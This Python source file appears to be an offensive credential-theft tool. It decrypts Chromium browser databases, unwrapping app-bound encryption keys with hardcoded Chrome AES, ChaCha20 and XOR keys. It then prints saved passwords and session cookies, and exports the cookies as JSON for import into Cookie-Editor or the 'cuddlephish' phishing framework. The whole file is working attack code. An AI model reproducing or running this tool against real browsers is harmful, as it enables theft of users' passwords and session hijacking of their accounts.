import sys
import base64
import sqlite3
import os
import argparse
from Crypto.Cipher import AES, ChaCha20_Poly1305
import binascii
import json
from datetime import datetime, timedelta
from pyasn1.codec.der import decoder

def cookies(key, master_key, file_location):
    if os.path.isfile(file_location) == False:
        print("Error: File does not exist")
        sys.exit(1)
    try:
        conn = sqlite3.connect(file_location)
        cursor = conn.cursor()
        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) from cookies')
        values = cursor.fetchall()
        for host_key, _, path, _, expires_utc, has_expires, name, encrypted_value in values:
            print("Host: " + host_key)
            print("Path: " + path)
            print("Name: " + name)
            print("Cookie: " + decrypt_data(encrypted_value,key, master_key, False) + ";")
            print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')) if has_expires else -1
            print("")
    except sqlite3.Error as e:
        print("Error: Could not connect to database")
        print(e)
        sys.exit(1)

def cookies_for_editor(key, master_key, file_location):
    cookies = []
    if os.path.isfile(file_location) == False:
        print("Error: File does not exist")
        sys.exit(1)
    try:
        conn = sqlite3.connect(file_location)
        cursor = conn.cursor()
        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) from cookies')
        values = cursor.fetchall()
        for host_key, _, path, _, expires_utc, has_expires, name, encrypted_value in values:
            decrypted_value = decrypt_data(encrypted_value, key, master_key, False)
            expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
            cookie = {
                "domain": host_key,
                "expirationDate": expiration_date,
                "hostOnly": not host_key.startswith('.'),
                "httpOnly": False,
                "name": name,
                "path": path,
                "sameSite": None,
                "secure": False,
                "session": False,
                "storeId": None,
                "value": decrypted_value
            }
            cookies.append(cookie)
        cookie_file_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_cookies.json"
        with open(cookie_file_name, 'w') as f:
            json.dump(cookies, f, indent=4)
        print("Cookies saved to " + cookie_file_name)
    except sqlite3.Error as e:
        print("Error: Could not connect to database")
        print(e)
        sys.exit(1)

def login_data(key, master_key, file_location):
    if os.path.isfile(file_location) == False:
        print("Error: File does not exist")
        sys.exit(1)
    try:
        conn = sqlite3.connect(file_location)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        values = cursor.fetchall()
        for origin_url, username_value, password_value in values:
            print("URL: " + origin_url)
            print("Username: " + username_value)
            print("Password: " + decrypt_data(password_value, key,master_key, True))
            print("")
    except sqlite3.Error as e:
        print("Error: Could not connect to database")
        print(e)
        sys.exit(1)

def cookies_for_cuddlephish(key, master_key, file_location):
    cookies = []
    if os.path.isfile(file_location) == False:
        print("Error: File does not exist")
        sys.exit(1)
    try:
        priority_map = {1: "Medium", 2: "High"}
        conn = sqlite3.connect(file_location)
        cursor = conn.cursor()
        cursor.execute('select creation_utc, host_key, top_frame_site_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor from cookies')
        values = cursor.fetchall()
        
        for creation_utc, host_key, top_frame_site_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor in values:
            decrypted_value = decrypt_data(encrypted_value, key, master_key, False)
            expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
        
            samesite_map = {0: "None", 1: "Lax", 2: "Strict"}
            
            source_scheme_map = {0: "NonSecure", 1: "Secure"}
            
            cookie = {
                'domain': host_key,
                'expires': expiration_date,
                'httpOnly': bool(is_httponly),
                'name': name,
                'path': path,
                'priority': priority_map.get(priority, "Medium"),
                'sameParty': False, 
                'sameSite': samesite_map.get(samesite, "None"),
                'secure': bool(is_secure),
                'session': not bool(is_persistent), 
                'size': len(name) + len(decrypted_value),
                'sourcePort': source_port,
                'value': decrypted_value
            }
            cookies.append(cookie)

        output = {
            "url": "about:blank",
            "cookies": cookies,
            "local_storage": []
        }
        cookie_file_name = "cuddlephish_" +datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".json"
        with open(cookie_file_name, 'w') as f:
            json.dump(output, f, indent=4)
        print("Cookies saved to " + cookie_file_name)
    except sqlite3.Error as e:
        print("Error: Could not connect to database")
        print(e)
        sys.exit(1)

def decrypt_data(encrypted_junk, key, master_key=None, password=False):
    #key = binascii.unhexlify(key)
    version = encrypted_junk[:3]
    if version in (b'v10', b'v11'):
        try:
            if password:
                initialisation_vector = encrypted_junk[3:15]
                encrypted_password = encrypted_junk[15:-16]
                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
                decrypted_pass = cipher.decrypt(encrypted_password)
                decrypted_pass = decrypted_pass.decode()
                return decrypted_pass
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                print("Error: Nonce cannot be empty")
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            tag = encrypted_junk[-16:]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            return text[32:].decode('utf-8')
        except Exception as e:
            print("Error: Could not decrypt password")
            print(e)
            return ""
    if version in (b'v20'):
        try:
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                print("Error: Nonce cannot be empty")
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            tag = encrypted_junk[-16:]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            if password:
                return text.decode('utf-8')
            else:
                return text[32:].decode('utf-8')
        except Exception as e:
            print("Error: Could not decrypt password")
            print(e)
            return ""

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def decode_cli_key(s):
    if s is None:
        return None
    base64_key = base64.b64encode(s.encode())
    # Convert string with \x.. into pure hex and unhexlify
    as_txt = base64.b64decode(base64_key).decode('utf-8').replace('\\x', '')
    return binascii.unhexlify(bytearray(as_txt, 'utf-8'))

def argparse_args():
    parser = argparse.ArgumentParser(description='Decrypt Chromium cookies and passwords given a key and DB file')
    parser.add_argument('-k', '--key', help='App Bound Decryption Key', required=False)
    parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'cuddlephish', 'firefox'], help='Option to choose', required=True)
    parser.add_argument('-f','--file', help='Location of the database file', required=True)
    parser.add_argument('--chrome-aes-key',help='Chrome AES Key',required=False)
    parser.add_argument('-mk','--master-key', help='Master Key (optional key used in v10 passwords and roaming profiles)', required=False)
    return parser.parse_args()

def main():
    args = argparse_args()
    option = args.option
    file_location = args.file
    chromeAES = args.chrome_aes_key
    if chromeAES:
        base64ChromeKey = base64.b64encode(chromeAES.encode())
    master_key = decode_cli_key(args.master_key) if args.master_key else None

    key = decode_cli_key(args.key) if args.key else None

    if not key and not master_key:
       print("[!] Error: Either -k (app-bound key) or -mk (master key) is required")
       sys.exit(1)
    if not key and master_key:
        key = master_key 
    # if key len is not 32, then its chrome 127+
    # https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234 
    #key = binascii.unhexlify(key)

    if (chromeAES):
        chromeKey = bytearray(base64.b64decode(base64ChromeKey).decode('utf-8').replace('\\x', ''), 'utf-8')
        chromeKey = binascii.unhexlify(chromeKey)

        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        xored_aes_key = byte_xor(chromeKey, xor_key)

    #print(len(key))
    if len(key) > 32:
        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        flag = key[0]
        iv = key[1:1+12]
        ciphertext = key[1+12:1+12+32]
        tag = key[1+12+32:]

        #check for flag to determine if AES or ChaCha. Changed in chrome 130+
        if flag == 1:
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        elif flag == 2:
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
        elif flag == 3:
            iv = key[1+32:1+32+12]
            ciphertext = key[1+32+12:1+32+12+32]
            tag = key[1+32+12+32:1+32+12+32+16]
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
        else:
            raise ValueError(f"Unsupported flag: {flag}")
        key = cipher.decrypt_and_verify(ciphertext, tag)
        print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")

    if option == "cookies":
        cookies(key, master_key, file_location)
    elif option == "passwords":
        login_data(key, master_key, file_location)
    elif option == "cookie-editor":
        cookies_for_editor(key, master_key, file_location)
    elif option == "cuddlephish":
        cookies_for_cuddlephish(key, master_key, file_location)
    elif option == "firefox":
        print("TO DO")
    else:
        print("Error: Invalid option")
        sys.exit(1)
    
if __name__ == "__main__":
    main()
